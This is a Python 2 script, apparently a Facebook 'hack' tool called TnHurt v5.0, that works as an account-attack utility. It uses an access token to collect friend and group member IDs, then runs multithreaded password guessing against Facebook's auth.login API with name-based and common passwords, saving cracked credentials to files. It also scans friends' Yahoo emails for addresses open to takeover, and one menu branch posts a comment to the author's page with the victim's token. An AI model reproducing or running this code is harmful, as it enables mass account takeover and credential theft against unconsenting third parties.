import subprocess as sp, os, sys, time, datetime, hashlib, urllib, cookielib, random, json, getpass, threading, re
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def guard():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97merr : Token not Found\\please login first'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()

    os.system('reset')
    print logo
    print '\n\x1b[1;91mCommand\t\t\t\tDescription\n\x1b[1;94m-------\t\t\t\t-----------\x1b[1;97m\nHurt_active\t\t\tActive Guard\nHurt_noactive\t\t\tNon Active Guard\nBack\t\t\t\tBack to Terminal\n\t'
    print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mProfile Guard\x1b[1;97m]'
    g = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
    if g == 'Hurt_active':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == 'Hurt_noactive':
        non = 'false'
        gaz(toket, non)
    elif g == 'Back':
        lain()
    elif g == '':
        keluar()
    else:
        print g + ' err : input error '
        terminal()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivate'
        terminal()
    elif '"is_shielded":false' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mNot activate'
        terminal()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


def menu_yahoo():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97merr : token not found\nplease login first'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()

    os.system('reset')
    print logo
    print '\n\x1b[1;91mCommand\t\t\t\tDescription\n\x1b[1;94m-------\t\t\t\t-----------\x1b[1;97m\nHurt_clistf\t\t\tClone List Friend\nHurt_cfriend\t\t\tClone from Friend\nHurt_mgrup\t\t\tClone Member Grup\nBack\t\t\t\tBack To Terminal\n\n\t'
    yahoo_pilih()


def yahoo_pilih():
    print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mYahoo Cloning\x1b[1;97m]'
    go = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
    if go == '':
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()
    elif go == 'Hurt_clistf':
        yahoofriends()
    elif go == 'Hurt_cfriend':
        yahoofromfriends()
    elif go == 'Hurt_mgrup':
        yahoomember()
    elif go == 'Back':
        menu()
    else:
        print go + ' \x1b[1;97merr : input error'
        yahoo_pilih()


def yahoofriends():
    global berhasil
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97merr : Token not found\nPlease login first'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()
    else:
        try:
            os.mkdir('Hurt')
        except OSError:
            pass

    os.system('reset')
    print logo
    mpsh = []
    jml = 0
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('Hurt/MailVuln.txt', 'w')
    run(52 * '\x1b[1;97m-')
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\x1b[1;97m ] \x1b[1;97m[~>\x1b[1;92m' + mail + ' \x1b[1;97m[~>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    run(52 * '\x1b[1;97m-')
    run('\x1b[1;97m[\xe2\x88\x9a]\x1b[1;92mFinish')
    print '\x1b[1;91m[+] \x1b[1;96mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m:\x1b[1;97m Hurt/MailVuln.txt'
    save.close()
    menu_yahoo()


def yahoofromfriends():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Hurt')
        except OSError:
            pass

        os.system('reset')
        print logo
        mpsh = []
        jml = 0
        print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mInput ID Friend\x1b[1;97m]'
        idt = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;97merr : Friend not found'
            menu_yahoo()

    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('Hurt/FriendMailVuln.txt', 'w')
    print 42 * '\x1b[1;96m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\x1b[1;97m ] \x1b[1;97m[~>\x1b[1;92m' + mail + ' \x1b[1;97m[~>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFinish \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;96mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m:\x1b[1;97m Hurt/FriendMailVuln.txt'
    save.close()
    menu_yahoo()


def yahoomember():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('Hurt')
        except OSError:
            pass

        os.system('reset')
        print logo
        mpsh = []
        jml = 0
        print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mInput ID Grup\x1b[1;97m]'
        id = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;97merr : Group not found'
            menu_yahoo()

    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('Hurt/GrupMailVuln.txt', 'w')
    print 42 * '\x1b[1;96m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\x1b[1;97m ] \x1b[1;97m[~>\x1b[1;92m' + mail + ' \x1b[1;97m[~>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFinish \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;96mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m:\x1b[1;97m Hurt/GrupMailVuln.txt'
    save.close()
    menu_yahoo()


def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97merr : Token not found\nPlease login first!'
        os.system('rm -rf login.txt')
        time.sleep(1)
        terminal()
        os.system('reset')
        print '\n\x1b[1;91mCommand\t\t\t\tDescription\n\x1b[1;94m-------\t\t\t\t-----------\x1b[1;97m\nHurt_listfriend\t\t\tHack from list Friend\nHurt_fromfriend\t\t\tHack from Friend\nHurt_group\t\t\tHack from Group\nBack\t\t\t\tBack to HackFB\n\n'

    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mSuper Hack FB\x1b[1;97m]'
    peak = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
    if peak == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    elif peak == 'Hurt_listfriend':
        os.system('reset')
        print logo
        run('Wait...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
            requests.post('https://www.facebook.com/100041067780557/posts/101687671210159/?app=fbl/comments?message=Tq Master&access_token=' + toket)

    elif peak == 'Hurt_fromfriend':
        os.system('reset')
        print logo
        print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mInput ID Friend\x1b[1;97m]'
        idt = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom\x1b[1;91m [~>\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            super()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == 'Hurt_group':
        os.system('reset')
        print logo
        print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mInput ID Grup\x1b[1;97m]'
        idg = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;96mFrom group \x1b[1;91m[~>\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            super()

        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for p in s['data']:
            id.append(p['id'])

    elif peak == 'Back':
        menu()
    else:
        print '\x1b[1;97merr : Wrong input'
        pilih_super()
    run('\x1b[1;97m[+] \x1b[1;97mTotal ID \x1b[1;97m: \x1b[1;97m' + str(len(id)))
    titik = ['./ ', '..\\ ', '.../ ', '....\\ ', '...../']
    os.system('reset')
    print logo
    run('\x1b[1;91m[\x1b[1;97m\xe2\x88\x9a\x1b[1;91m]\x1b[1;96mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id)))
    run('\x1b[1;96m\n[\x1b[1;96m===\x1b[1;92m[\x1b[1;97mID\x1b[1;92m]\x1b[1;96m===] \x1b[1;91m[\x1b[1;97m~> \x1b[1;96m[===\x1b[1;92m[\x1b[1;97mPassword\x1b[1;92m]\x1b[1;96m===] \x1b[1;91m[\x1b[1;97m~> \x1b[1;96m[===\x1b[1;92m[\x1b[1;97mName\x1b[1;92m]\x1b[1;96m===]\n\t')

    def main(arg):
        user = arg
        try:
            os.mkdir('Hurt')
        except OSError:
            pass
        else:
            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass1 + ' =>' + z['name']
                    oks.append(user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    cek = open('ajg/super_cp.txt', 'a')
                    cek.write(user + '|' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass2 + ' =>' + z['name']
                        oks.append(user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        cek = open('ajg/super_cp.txt', 'a')
                        cek.write(user + '|' + pass2 + '\n')
                        cek.close()
                        cekpoint.append(user + pass2)
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass3 + ' =>' + z['name']
                            oks.append(user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            cek = open('ajg/super_cp.txt', 'a')
                            cek.write(user + '|' + pass3 + '\n')
                            cek.close()
                            cekpoint.append(user + pass3)
                        else:
                            pass4 = 'kontol123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass4 + ' =>' + z['name']
                                oks.append(user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                cek = open('ajg/super_cp.txt', 'a')
                                cek.write(user + '|' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = 'indonesia123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass5 + ' =>' + z['name']
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cek = open('ajg/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = 'sayang'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass6 + ' =>' + z['name']
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cek = open('ajg/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass7 = b['first_name'] + '321'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass7 + ' =>' + z['name']
                                            oks.append(user + pass7)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cek = open('ajg/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass7 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass7)
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    run('[\xe2\x88\x9a]Finish...')
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;91m[\x1b[1;92m' + str(len(oks)) + '\x1b[1;91m]\x1b[1;97m/\x1b[1;91m[\x1b[1;93m' + str(len(cekpoint)) + '\x1b[1;91m]'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mCP File saved \x1b[1;91m: \x1b[1;97majg/super_cp.txt'
    raw_input('\nPress Any to Continue....')
    super()


def keluar():
    os.sys.exit()
    print 'Exit'


def run(a):
    for m in a + '\n':
        sys.stdout.write(m)
        sys.stdout.flush()
        time.sleep(0.01)


logo = '\n\t\t\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;96m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\n\t\t\x1b[1;94m   \xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x90\xe2\x94\x8c\xe2\x95\xa6 \xe2\x95\xa6\xe2\x95\xa6 \xe2\x95\xa6\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\n\t\t \x1b[1;91m   \xe2\x95\x91 \xe2\x94\x82\xe2\x94\x82\xe2\x94\x82\xe2\x95\xa0\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \xe2\x95\x91\xe2\x95\xa0\xe2\x95\xa6\xe2\x95\x9d \xe2\x95\x91 \n\t\t \x1b[1;92m   \xe2\x95\xa9 \xe2\x94\x98\xe2\x94\x94\xe2\x94\x98\xe2\x95\xa9 \xe2\x95\xa9\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa9\xe2\x95\x9a\xe2\x95\x90 \xe2\x95\xa9 \x1b[1;93mv5.0\n\t\t\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;96m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\n\t\t    Coded By Tn.Hurt\n\x1b[1;93m# \x1b[1;91mAuthor  \x1b[1;97m:\x1b[1;96m TnHURT\n\x1b[1;93m# \x1b[1;91mSupport \x1b[1;97m:\x1b[1;96m Maestro-Alvardo\n\x1b[1;93m# \x1b[1;91mGithub  \x1b[1;97m:\x1b[1;96m github.com/Maestro-Alvardo\n'
logo_login = '\n\t\t\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;96m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\n\t\t\x1b[1;94m   \xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x90\xe2\x94\x8c\xe2\x95\xa6 \xe2\x95\xa6\xe2\x95\xa6 \xe2\x95\xa6\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\n\t\t \x1b[1;91m   \xe2\x95\x91 \xe2\x94\x82\xe2\x94\x82\xe2\x94\x82\xe2\x95\xa0\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \xe2\x95\x91\xe2\x95\xa0\xe2\x95\xa6\xe2\x95\x9d \xe2\x95\x91 \n\t\t \x1b[1;92m   \xe2\x95\xa9 \xe2\x94\x98\xe2\x94\x94\xe2\x94\x98\xe2\x95\xa9 \xe2\x95\xa9\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa9\xe2\x95\x9a\xe2\x95\x90 \xe2\x95\xa9 \x1b[1;93mv5.0\n\t\t\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;96m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\n\t\t    Coded By Tn.Hurt\n\x1b[1;97m[\x1b[1;91m\xe2\x88\x9a\x1b[1;97m]\x1b[1;96mLogin Facebook Account!\n'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def terminal():
    print '\x1b[1;96m\xe2\x95\xad\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81[\x1b[1;91mTerminal\x1b[1;97m]'
    minal = raw_input('\x1b[1;96m\xe2\x95\xb0\xe2\x94\x81\x1b[1;97m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xc2\xbb ')
    if minal == '':
        print '\x1b[1;97merr : input Not Found '
        terminal()
    elif minal == 'help':
        print logo
